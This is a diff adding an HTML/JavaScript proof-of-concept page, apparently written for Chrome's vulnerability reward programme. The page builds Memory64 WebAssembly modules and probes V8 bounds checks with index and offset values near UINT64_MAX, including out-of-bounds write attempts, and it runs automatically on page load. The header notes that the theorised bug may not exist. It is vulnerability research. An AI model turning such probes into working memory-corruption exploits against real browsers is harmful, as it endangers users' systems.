@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<!--
+  Memory64 Bounds Check Integer Overflow - Chrome VRP PoC
+  ========================================================
+  Target: V8 14.7.0 (Chrome 145.0.7632.116)
+  Requires: --experimental-wasm-memory64 flag
+  
+  VULNERABILITY THEORY (Finding 4):
+  In wasm/turboshaft-graph-interface.cc BoundsCheckMem (~line 7900-7920),
+  for Memory64 with trap handler enabled:
+  
+    V<Word32> cond = __ Uint64LessThan(
+        V<Word64>::Cast(converted_index),
+        __ Word64Constant(uint64_t{wasm::kMaxMemory64Size - end_offset}));
+    __ TrapIfNot(cond, TrapId::kTrapMemOutOfBounds);
+  
+  The check verifies: index < kMaxMemory64Size - end_offset
+  
+  After the check, the effective address is computed as:
+    effective_offset = WordPtrAdd(converted_index, imm.offset)
+    addr = WordPtrAdd(MemStart, effective_offset)
+  
+  POTENTIAL OVERFLOW SCENARIO:
+  If end_offset = offset + access_size - 1, and index is near UINT64_MAX:
+  - The compile-time subtraction kMaxMemory64Size - end_offset is safe
+  - But the runtime addition converted_index + offset can overflow WordPtr
+  - On 64-bit systems, if index + offset wraps around, the effective address
+    could point to a different location in the process address space
+  - The trap handler only catches accesses beyond the guard region
+  
+  Note: kMaxMemory64Size is typically much smaller than UINT64_MAX,
+  so index values near UINT64_MAX should ALWAYS be caught by the check.
+  The vulnerability exists only if there's an edge case where the check
+  can be bypassed or if the overflow wraps into the guard region.
+  
+  This PoC tests Memory64 bounds checking by attempting loads at various
+  near-overflow indices and checking if they properly trap.
+  
+  LAUNCH CHROME WITH:
+  chrome --enable-features=WebAssemblyMemory64 --experimental-wasm-memory64
+  or: chrome --js-flags="--experimental-wasm-memory64"
+-->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Memory64 Bounds Check Overflow - Chrome VRP</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Courier New', monospace; background: #0c0c14; color: #d0d0d0; padding: 20px; }
+  h1 { color: #ff5252; font-size: 1.3em; margin-bottom: 8px; }
+  .info { color: #666; font-size: 0.85em; margin-bottom: 15px; }
+  .controls { background: #151528; padding: 12px; border-radius: 6px; margin-bottom: 15px; border-left: 3px solid #82b1ff; }
+  button { background: #ff5252; color: white; border: none; padding: 8px 16px; cursor: pointer; font-family: monospace; border-radius: 4px; margin: 3px; }
+  button:hover { background: #ff8a80; }
+  #results { max-height: 70vh; overflow-y: auto; background: #111; padding: 10px; border-radius: 6px; margin-top: 10px; }
+  .result { padding: 3px 6px; margin: 2px 0; font-size: 0.85em; word-break: break-all; }
+  .SAFE { color: #2ecc71; }
+  .SUSPICIOUS { color: #f39c12; }
+  .VULNERABLE { color: #e74c3c; font-weight: bold; }
+  .INFO { color: #3498db; }
+  .ERROR { color: #e74c3c; }
+  .WARN { color: #f39c12; }
+</style>
+</head>
+<body>
+
+<h1>Memory64 Bounds Check Integer Overflow</h1>
+<p class="info">Finding 4 | V8 14.7.0 | Chrome VRP Security Research</p>
+<p class="info">Requires: --experimental-wasm-memory64 or --enable-features=WebAssemblyMemory64</p>
+
+<div class="controls">
+  <button onclick="runAllTests()">Run All Tests</button>
+  <button onclick="document.getElementById('results').innerHTML=''">Clear</button>
+  <p style="color:#999;font-size:0.8em;margin-top:6px;">
+    Tests Memory64 bounds checking at near-overflow index values.
+  </p>
+</div>
+
+<div id="results"></div>
+
+<script>
+'use strict';
+
+const resultsDiv = document.getElementById('results');
+
+function log(msg, cls = 'INFO') {
+  const div = document.createElement('div');
+  div.className = 'result ' + cls;
+  div.textContent = `[${cls}] ${msg}`;
+  resultsDiv.appendChild(div);
+  resultsDiv.scrollTop = resultsDiv.scrollHeight;
+}
+
+// =========================================================================
+// Wasm Binary Encoding Helpers with BigInt support for Memory64
+// =========================================================================
+function uleb128(value) {
+  const r = [];
+  if (value < 0) value = value >>> 0;
+  do { let b = value & 0x7F; value >>>= 7; if (value) b |= 0x80; r.push(b); } while (value);
+  return r;
+}
+
+function sleb128(value) {
+  const r = [];
+  while (true) {
+    let b = value & 0x7F; value >>= 7;
+    if ((value === 0 && !(b & 0x40)) || (value === -1 && (b & 0x40))) { r.push(b); break; }
+    r.push(b | 0x80);
+  }
+  return r;
+}
+
+// Signed LEB128 for 64-bit BigInt values
+function sleb128_64(value) {
+  const r = [];
+  let v = BigInt(value);
+  while (true) {
+    let byte = Number(v & 0x7Fn);
+    v >>= 7n;
+    if ((v === 0n && !(byte & 0x40)) || (v === -1n && (byte & 0x40))) {
+      r.push(byte);
+      break;
+    }
+    r.push(byte | 0x80);
+  }
+  return r;
+}
+
+// Unsigned LEB128 for 64-bit BigInt values
+function uleb128_64(value) {
+  const r = [];
+  let v = BigInt(value);
+  do {
+    let byte = Number(v & 0x7Fn);
+    v >>= 7n;
+    if (v !== 0n) byte |= 0x80;
+    r.push(byte);
+  } while (v !== 0n);
+  return r;
+}
+
+function encodeString(s) {
+  const b = new TextEncoder().encode(s);
+  return [...uleb128(b.length), ...b];
+}
+
+function makeSection(id, content) {
+  return [id, ...uleb128(content.length), ...content];
+}
+
+const WASM_HEADER = [0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00];
+const FUNC_TYPE = 0x60;
+const TYPE = {
+  I32: 0x7F, I64: 0x7E, F32: 0x7D, F64: 0x7C,
+};
+const SEC = {
+  TYPE: 1, IMPORT: 2, FUNCTION: 3, TABLE: 4, MEMORY: 5,
+  GLOBAL: 6, EXPORT: 7, START: 8, ELEMENT: 9, CODE: 10, DATA: 11,
+};
+
+// Memory64 limits flags (from wasm-constants.h)
+const LIMITS = {
+  MEM64_NO_MAX: 0x04,      // kMemory64NoMaximum
+  MEM64_WITH_MAX: 0x05,    // kMemory64WithMaximum
+};
+
+// Opcodes
+const O = {
+  UNREACHABLE: 0x00, BLOCK: 0x02, LOOP: 0x03, IF: 0x04, ELSE: 0x05,
+  END: 0x0B, BR: 0x0C, BR_IF: 0x0D, RETURN: 0x0F,
+  DROP: 0x1A,
+  LOCAL_GET: 0x20, LOCAL_SET: 0x21,
+  I32_CONST: 0x41, I64_CONST: 0x42,
+  I32_EQZ: 0x45,
+  I64_LOAD: 0x29,     // i64.load
+  I32_LOAD: 0x28,     // i32.load
+  I32_STORE: 0x36,    // i32.store
+  I64_STORE: 0x37,    // i64.store
+  I32_LOAD8_U: 0x2D,  // i32.load8_u
+  I32_ADD: 0x6A, I32_SUB: 0x6B,
+  I64_ADD: 0x7C,
+  I32_WRAP_I64: 0xA7,
+};
+
+// =========================================================================
+// Build Memory64 Module
+// =========================================================================
+function buildMemory64Module() {
+  // Types:
+  //   0: func (i64) -> i32      [load32 at index]
+  //   1: func (i64) -> i64      [load64 at index]
+  //   2: func (i64, i32) -> ()  [store32 at index]
+  //   3: func () -> i64         [get memory size]
+
+  const typeSection = [
+    0x04, // 4 types (no rec group needed for non-GC types)
+
+    // Type 0: func(i64) -> i32
+    FUNC_TYPE, 0x01, TYPE.I64, 0x01, TYPE.I32,
+
+    // Type 1: func(i64) -> i64
+    FUNC_TYPE, 0x01, TYPE.I64, 0x01, TYPE.I64,
+
+    // Type 2: func(i64, i32) -> ()
+    FUNC_TYPE, 0x02, TYPE.I64, TYPE.I32, 0x00,
+
+    // Type 3: func() -> i64
+    FUNC_TYPE, 0x00, 0x01, TYPE.I64,
+  ];
+
+  // Memory section: 1 memory64, 1 page minimum, no maximum
+  // Memory64 flag = 0x04 (kMemory64NoMaximum)
+  const memorySection = [
+    0x01,                   // 1 memory
+    LIMITS.MEM64_NO_MAX,    // memory64, no maximum
+    0x01,                   // 1 page minimum (65536 bytes)
+  ];
+
+  const funcSection = [
+    0x04,  // 4 functions
+    0x00,  // func 0: load32 (type 0)
+    0x01,  // func 1: load64 (type 1)
+    0x02,  // func 2: store32 (type 2)
+    0x03,  // func 3: mem_size (type 3)
+  ];
+
+  const exportSection = [
+    0x05, // 5 exports
+    ...encodeString('load32'), 0x00, 0x00,
+    ...encodeString('load64'), 0x00, 0x01,
+    ...encodeString('store32'), 0x00, 0x02,
+    ...encodeString('mem_size'), 0x00, 0x03,
+    ...encodeString('memory'), 0x02, 0x00, // export memory
+  ];
+
+  // Function 0: load32(index: i64) -> i32
+  // Does i32.load with the given 64-bit index
+  // The load instruction in memory64 uses i64 as the index
+  // i32.load memarg: alignment=2 (4-byte aligned), offset=0
+  const func0Body = [
+    0x00, // 0 locals
+    O.LOCAL_GET, 0x00,        // get index (i64)
+    O.I32_LOAD, 0x02, 0x00,  // i32.load align=2 offset=0
+    O.END,
+  ];
+
+  // Function 1: load64(index: i64) -> i64
+  const func1Body = [
+    0x00,
+    O.LOCAL_GET, 0x00,
+    O.I64_LOAD, 0x03, 0x00,  // i64.load align=3 offset=0
+    O.END,
+  ];
+
+  // Function 2: store32(index: i64, value: i32) -> ()
+  const func2Body = [
+    0x00,
+    O.LOCAL_GET, 0x00,        // index
+    O.LOCAL_GET, 0x01,        // value
+    O.I32_STORE, 0x02, 0x00,  // i32.store align=2 offset=0
+    O.END,
+  ];
+
+  // Function 3: mem_size() -> i64
+  // memory.size returns i64 for memory64
+  const func3Body = [
+    0x00,
+    0x3F, 0x00,  // memory.size 0
+    O.END,
+  ];
+
+  function encodeBody(body) {
+    return [...uleb128(body.length), ...body];
+  }
+
+  const codeSection = [
+    0x04,
+    ...encodeBody(func0Body),
+    ...encodeBody(func1Body),
+    ...encodeBody(func2Body),
+    ...encodeBody(func3Body),
+  ];
+
+  // Data section: initialize first 16 bytes with sentinel values
+  // For memory64, data segment uses i64 offset
+  const dataSection = [
+    0x01, // 1 data segment
+    0x00, // flags: active, memory 0
+    O.I64_CONST, 0x00, O.END, // offset = 0 (i64.const 0 for memory64)
+    0x10, // 16 bytes of data
+    // Sentinel pattern: 0xDEADBEEFCAFEBABE0011223344556677
+    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
+    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
+  ];
+
+  const moduleBytes = [
+    ...WASM_HEADER,
+    ...makeSection(SEC.TYPE, typeSection),
+    ...makeSection(SEC.FUNCTION, funcSection),
+    ...makeSection(SEC.MEMORY, memorySection),
+    ...makeSection(SEC.EXPORT, exportSection),
+    ...makeSection(SEC.CODE, codeSection),
+    ...makeSection(SEC.DATA, dataSection),
+  ];
+
+  return new Uint8Array(moduleBytes);
+}
+
+// =========================================================================
+// Build Memory64 Module with Offset in Load Instructions
+// =========================================================================
+function buildMemory64OffsetModule() {
+  // This module tests loads with large static offsets
+  // The critical pattern: i32.load offset=<large> where index + offset overflows
+
+  const typeSection = [
+    0x02,
+    // Type 0: func(i64) -> i32 [load with offset 0x20]
+    FUNC_TYPE, 0x01, TYPE.I64, 0x01, TYPE.I32,
+    // Type 1: func(i64) -> i32 [load with offset 0x100]
+    FUNC_TYPE, 0x01, TYPE.I64, 0x01, TYPE.I32,
+  ];
+
+  const memorySection = [
+    0x01, LIMITS.MEM64_NO_MAX, 0x01,
+  ];
+
+  const funcSection = [
+    0x02, 0x00, 0x01,
+  ];
+
+  const exportSection = [
+    0x03,
+    ...encodeString('load_off32'), 0x00, 0x00,
+    ...encodeString('load_off256'), 0x00, 0x01,
+    ...encodeString('memory'), 0x02, 0x00,
+  ];
+
+  // func 0: load with offset=0x20 (32)
+  // i32.load align=2 offset=0x20
+  const func0Body = [
+    0x00,
+    O.LOCAL_GET, 0x00,
+    O.I32_LOAD, 0x02, ...uleb128(0x20), // offset = 32
+    O.END,
+  ];
+
+  // func 1: load with offset=0x100 (256)
+  const func1Body = [
+    0x00,
+    O.LOCAL_GET, 0x00,
+    O.I32_LOAD, 0x02, ...uleb128(0x100), // offset = 256
+    O.END,
+  ];
+
+  function encodeBody(body) {
+    return [...uleb128(body.length), ...body];
+  }
+
+  const codeSection = [
+    0x02,
+    ...encodeBody(func0Body),
+    ...encodeBody(func1Body),
+  ];
+
+  const moduleBytes = [
+    ...WASM_HEADER,
+    ...makeSection(SEC.TYPE, typeSection),
+    ...makeSection(SEC.FUNCTION, funcSection),
+    ...makeSection(SEC.MEMORY, memorySection),
+    ...makeSection(SEC.EXPORT, exportSection),
+    ...makeSection(SEC.CODE, codeSection),
+  ];
+
+  return new Uint8Array(moduleBytes);
+}
+
+// =========================================================================
+// Test 1: Basic Memory64 Bounds Checking
+// =========================================================================
+async function testBasicBounds() {
+  log('=== Test 1: Basic Memory64 Bounds Checking ===');
+  log('Verifying that in-bounds accesses work and OOB traps correctly.');
+
+  try {
+    const wasmBytes = buildMemory64Module();
+    log(`Module built: ${wasmBytes.length} bytes`);
+
+    const module = await WebAssembly.compile(wasmBytes);
+    const instance = await WebAssembly.instantiate(module);
+    log('Memory64 module compiled and instantiated');
+
+    const { load32, load64, store32, mem_size, memory } = instance.exports;
+
+    const memSize = mem_size();
+    log(`Memory size: ${memSize} pages (${Number(memSize) * 65536} bytes)`);
+
+    // Valid access at index 0
+    try {
+      const val = load32(0n);
+      log(`load32(0): 0x${(val >>> 0).toString(16).padStart(8, '0')} - OK`, 'SAFE');
+    } catch (e) {
+      log(`load32(0): UNEXPECTED TRAP: ${e.message}`, 'SUSPICIOUS');
+    }
+
+    // Valid access near end of memory
+    try {
+      const val = load32(BigInt(65536 - 4)); // last valid i32 position
+      log(`load32(65532): 0x${(val >>> 0).toString(16)} - OK`, 'SAFE');
+    } catch (e) {
+      log(`load32(65532): ${e.message}`, 'SUSPICIOUS');
+    }
+
+    // OOB: just past memory
+    try {
+      const val = load32(65536n);
+      log(`load32(65536): GOT VALUE ${val} - SHOULD HAVE TRAPPED!`, 'VULNERABLE');
+      return 100;
+    } catch (e) {
+      if (e instanceof WebAssembly.RuntimeError) {
+        log(`load32(65536): Properly trapped: ${e.message}`, 'SAFE');
+      } else {
+        log(`load32(65536): Unexpected error: ${e.message}`, 'SUSPICIOUS');
+      }
+    }
+
+    return 0;
+  } catch (e) {
+    if (e.message.includes('memory64') || e.message.includes('Memory64') ||
+        e.message.includes('not supported') || e.message.includes('invalid')) {
+      log(`Memory64 not available: ${e.message}`, 'WARN');
+      log('Launch Chrome with: --js-flags="--experimental-wasm-memory64"', 'INFO');
+      return -1;
+    }
+    log(`Error: ${e.message}`, 'ERROR');
+    return -1;
+  }
+}
+
+// =========================================================================
+// Test 2: Near-Overflow Index Values
+// =========================================================================
+async function testNearOverflow() {
+  log('');
+  log('=== Test 2: Near-Overflow Index Values ===');
+  log('Testing if index values near UINT64_MAX bypass bounds checks');
+  log('when index + offset overflows.');
+
+  try {
+    const wasmBytes = buildMemory64Module();
+    const module = await WebAssembly.compile(wasmBytes);
+    const instance = await WebAssembly.instantiate(module);
+
+    const { load32, load64 } = instance.exports;
+
+    let suspicious = 0;
+
+    // Test indices near UINT64_MAX
+    // The bounds check should catch these:
+    // index < kMaxMemory64Size - end_offset
+    // kMaxMemory64Size is typically 2^48 or similar
+    // So any index > kMaxMemory64Size should be caught
+
+    const testIndices = [
+      // Near the overflow boundary
+      { idx: 0xFFFFFFFFFFFFFFFFn - 0x20n, desc: 'UINT64_MAX - 0x20' },
+      { idx: 0xFFFFFFFFFFFFFFFFn - 0x10n, desc: 'UINT64_MAX - 0x10' },
+      { idx: 0xFFFFFFFFFFFFFFFFn - 0x04n, desc: 'UINT64_MAX - 0x04' },
+      { idx: 0xFFFFFFFFFFFFFFFFn - 0x03n, desc: 'UINT64_MAX - 0x03' },
+      { idx: 0xFFFFFFFFFFFFFFFFn, desc: 'UINT64_MAX' },
+      { idx: 0xFFFFFFFFFFFFFFF0n, desc: 'UINT64_MAX & ~0xF' },
+      // Values that would make index + 0x20 overflow to small values
+      { idx: 0xFFFFFFFFFFFFFFE0n, desc: 'UINT64_MAX - 0x1F (overflow to 0)' },
+      { idx: 0xFFFFFFFFFFFFFFD0n, desc: 'UINT64_MAX - 0x2F (overflow to ~0)' },
+      // Large but not max values
+      { idx: 0x0001000000000000n, desc: '2^48 (above typical kMaxMemory64Size)' },
+      { idx: 0x0000FFFFFFFFFFFFn, desc: '2^48 - 1' },
+      { idx: 0x00000FFFFFFFFFFFn, desc: '2^44 - 1' },
+      // Values near memory page boundary
+      { idx: 0x10000n, desc: '65536 (1 page)' },
+      { idx: 0xFFFFn, desc: '65535' },
+      { idx: 0x10000n - 4n, desc: '65532 (last valid i32)' },
+    ];
+
+    for (const { idx, desc } of testIndices) {
+      try {
+        const val = load32(idx);
+        if (idx >= 65536n - 3n) {
+          // Should have trapped
+          log(`load32(${desc}): GOT ${val} (0x${(val>>>0).toString(16)}) - ` +
+              `SHOULD HAVE TRAPPED! BOUNDS CHECK BYPASSED!`, 'VULNERABLE');
+          suspicious += 10;
+        } else {
+          log(`load32(${desc}): ${val} - in bounds, OK`, 'SAFE');
+        }
+      } catch (e) {
+        if (e instanceof WebAssembly.RuntimeError) {
+          if (idx < 65536n - 3n) {
+            log(`load32(${desc}): Unexpected trap for valid index`, 'SUSPICIOUS');
+            suspicious++;
+          } else {
+            log(`load32(${desc}): Properly trapped`, 'SAFE');
+          }
+        } else {
+          log(`load32(${desc}): Unexpected error: ${e.message}`, 'SUSPICIOUS');
+          suspicious++;
+        }
+      }
+    }
+
+    return suspicious;
+  } catch (e) {
+    if (e.message.includes('memory64') || e.message.includes('not supported')) {
+      log('Memory64 not available - skipping', 'WARN');
+      return -1;
+    }
+    log(`Error: ${e.message}`, 'ERROR');
+    return -1;
+  }
+}
+
+// =========================================================================
+// Test 3: Offset Overflow Test
+// =========================================================================
+async function testOffsetOverflow() {
+  log('');
+  log('=== Test 3: Index + Static Offset Overflow ===');
+  log('Testing if index + static_offset overflows and bypasses bounds check.');
+  log('e.g., index = 0xFFFF_FFFF_FFFF_FFF0, offset = 0x20 → wraps to 0x10');
+
+  try {
+    const wasmBytes = buildMemory64OffsetModule();
+    const module = await WebAssembly.compile(wasmBytes);
+    const instance = await WebAssembly.instantiate(module);
+
+    const { load_off32, load_off256 } = instance.exports;
+
+    let suspicious = 0;
+
+    // Test: index + offset = overflow
+    // load_off32 does: i32.load offset=0x20 (index)
+    // Effective address = index + 0x20
+    // If index = UINT64_MAX - 0x1F = 0xFFFF_FFFF_FFFF_FFE0
+    // Then index + 0x20 = 0x10000_0000_0000_0000 = overflow to 0
+    // If bounds check only checks index < kMaxMemory64Size - end_offset
+    // and end_offset = 0x20 + 4 - 1 = 0x23
+    // then kMaxMemory64Size - 0x23 is still within 64-bit range
+    // and index (0xFFFF...FFE0) > that → should be caught
+    //
+    // But if the overflow happens in the BOUNDS CHECK ITSELF:
+    // WordPtrAdd(converted_index, end_offset) overflow → small value
+    // Then Uint64LessThanOrEqual to kMaxMemory64Size passes
+
+    const overflowTests = [
+      // index + 0x20 overflows to 0x00
+      { fn: 'load_off32', func: load_off32, idx: 0xFFFFFFFFFFFFFFE0n, desc: 'idx+0x20 wraps to 0' },
+      // index + 0x20 overflows to 0x10
+      { fn: 'load_off32', func: load_off32, idx: 0xFFFFFFFFFFFFFFF0n, desc: 'idx+0x20 wraps to 0x10' },
+      // index + 0x100 overflows
+      { fn: 'load_off256', func: load_off256, idx: 0xFFFFFFFFFFFFFF00n, desc: 'idx+0x100 wraps to 0' },
+      // index + 0x100 overflows to 0x100
+      { fn: 'load_off256', func: load_off256, idx: 0x10n, desc: 'valid: idx=0x10+0x100=0x110' },
+      // Near boundaries
+      { fn: 'load_off32', func: load_off32, idx: 0n, desc: 'valid: idx=0+0x20=0x20' },
+      { fn: 'load_off32', func: load_off32, idx: 0xFF00n, desc: 'valid: near end' },
+      { fn: 'load_off32', func: load_off32, idx: 0xFFDCn, desc: 'valid: last valid (65500+32+4<=65536)' },
+      // Just OOB
+      { fn: 'load_off32', func: load_off32, idx: 0xFFE0n, desc: 'slightly OOB: 65504+32+4>65536' },
+    ];
+
+    for (const { fn, func, idx, desc } of overflowTests) {
+      try {
+        const val = func(idx);
+        // Check if this was supposed to be OOB
+        const effectiveAddr = idx + (fn === 'load_off32' ? 0x20n : 0x100n);
+        const effectiveEnd = effectiveAddr + 4n; // i32 = 4 bytes
+
+        if (effectiveEnd > 65536n && effectiveAddr < 65536n) {
+          log(`${fn}(${desc}): GOT ${val} - partial OOB, SHOULD TRAP`, 'VULNERABLE');
+          suspicious += 5;
+        } else if (effectiveAddr >= 65536n || effectiveAddr < idx) {
+          // Overflow case or definitely OOB
+          log(`${fn}(${desc}): GOT ${val} (0x${(val>>>0).toString(16)}) - ` +
+              `BOUNDS CHECK BYPASSED!`, 'VULNERABLE');
+          suspicious += 10;
+        } else {
+          log(`${fn}(${desc}): ${val} (0x${(val>>>0).toString(16)}) - in bounds, OK`, 'SAFE');
+        }
+      } catch (e) {
+        if (e instanceof WebAssembly.RuntimeError) {
+          const effectiveAddr = idx + (fn === 'load_off32' ? 0x20n : 0x100n);
+          if (effectiveAddr + 4n <= 65536n && effectiveAddr >= idx) {
+            log(`${fn}(${desc}): Unexpected trap for valid address`, 'SUSPICIOUS');
+            suspicious++;
+          } else {
+            log(`${fn}(${desc}): Properly trapped`, 'SAFE');
+          }
+        } else {
+          log(`${fn}(${desc}): ${e.message}`, 'INFO');
+        }
+      }
+    }
+
+    return suspicious;
+  } catch (e) {
+    if (e.message.includes('memory64') || e.message.includes('not supported')) {
+      log('Memory64 not available - skipping', 'WARN');
+      return -1;
+    }
+    log(`Error: ${e.message}`, 'ERROR');
+    return -1;
+  }
+}
+
+// =========================================================================
+// Test 4: JIT-optimized bounds check bypass
+// =========================================================================
+async function testJITBoundsCheck() {
+  log('');
+  log('=== Test 4: JIT-Optimized Bounds Check ===');
+  log('Warming up load functions to trigger Turboshaft compilation,');
+  log('then testing near-overflow indices. The trap handler path');
+  log('in the JIT uses a different bounds check than the interpreter.');
+
+  try {
+    const wasmBytes = buildMemory64Module();
+    const module = await WebAssembly.compile(wasmBytes);
+    const instance = await WebAssembly.instantiate(module);
+
+    const { load32, store32 } = instance.exports;
+
+    let suspicious = 0;
+
+    // Warm up: many valid accesses to trigger JIT compilation
+    log('Warming up (100K valid accesses)...');
+    for (let i = 0; i < 100000; i++) {
+      const idx = BigInt((i * 4) % 65532);
+      try {
+        load32(idx);
+      } catch (e) {
+        // ignore
+      }
+    }
+    log('Warmup complete - function should be JIT compiled now');
+
+    // Now test OOB with various near-overflow values
+    const oobTests = [
+      0xFFFFFFFFFFFFFFFFn,
+      0xFFFFFFFFFFFFFFFEn,
+      0xFFFFFFFFFFFFFFF0n,
+      0xFFFFFFFFFFFFFFE0n,
+      0xFFFFFFFF00000000n,
+      0x100000000n,
+      0xFFFFn + 1n,
+      0x10000n, // just past 1 page
+    ];
+
+    for (const idx of oobTests) {
+      try {
+        const val = load32(idx);
+        log(`JIT load32(0x${idx.toString(16)}): GOT ${val} - ` +
+            `BOUNDS CHECK BYPASSED IN JIT!`, 'VULNERABLE');
+        suspicious += 10;
+      } catch (e) {
+        if (e instanceof WebAssembly.RuntimeError) {
+          log(`JIT load32(0x${idx.toString(16)}): Properly trapped`, 'SAFE');
+        } else {
+          log(`JIT load32(0x${idx.toString(16)}): ${e.message}`, 'INFO');
+        }
+      }
+    }
+
+    // Test write-what-where: try to store at overflow addresses
+    log('--- Write test at overflow addresses ---');
+    for (const idx of [0xFFFFFFFFFFFFFFE0n, 0xFFFFFFFFFFFFFFF0n]) {
+      try {
+        store32(idx, 0x41414141);
+        log(`JIT store32(0x${idx.toString(16)}): SUCCEEDED - WRITE OOB!`, 'VULNERABLE');
+        suspicious += 20;
+      } catch (e) {
+        log(`JIT store32(0x${idx.toString(16)}): Properly trapped`, 'SAFE');
+      }
+    }
+
+    return suspicious;
+  } catch (e) {
+    if (e.message.includes('memory64') || e.message.includes('not supported')) {
+      log('Memory64 not available - skipping', 'WARN');
+      return -1;
+    }
+    log(`Error: ${e.message}`, 'ERROR');
+    return -1;
+  }
+}
+
+// =========================================================================
+// Main
+// =========================================================================
+async function runAllTests() {
+  resultsDiv.innerHTML = '';
+  log('Memory64 Bounds Check Integer Overflow PoC');
+  log(`Target: V8 14.7.0 / Chrome 145.0.7632.116`);
+  log(`User-Agent: ${navigator.userAgent}`);
+  log(`Date: ${new Date().toISOString()}`);
+  log('');
+
+  let totalSuspicious = 0;
+
+  const r1 = await testBasicBounds();
+  if (r1 === -1) {
+    log('');
+    log('Memory64 not available. Cannot run remaining tests.', 'WARN');
+    log('Launch with: chrome --js-flags="--experimental-wasm-memory64"', 'INFO');
+    return;
+  }
+  totalSuspicious += r1;
+
+  const r2 = await testNearOverflow();
+  if (r2 >= 0) totalSuspicious += r2;
+
+  const r3 = await testOffsetOverflow();
+  if (r3 >= 0) totalSuspicious += r3;
+
+  const r4 = await testJITBoundsCheck();
+  if (r4 >= 0) totalSuspicious += r4;
+
+  log('');
+  if (totalSuspicious >= 10) {
+    log(`FINAL VERDICT: VULNERABLE (score=${totalSuspicious}) - ` +
+        `Memory64 bounds check bypass detected!`, 'VULNERABLE');
+  } else if (totalSuspicious > 0) {
+    log(`FINAL VERDICT: SUSPICIOUS (score=${totalSuspicious})`, 'SUSPICIOUS');
+  } else {
+    log('FINAL VERDICT: SAFE - All bounds checks enforced correctly', 'SAFE');
+  }
+}
+
+window.addEventListener('load', () => setTimeout(runAllTests, 500));
+</script>
+</body>
+</html>
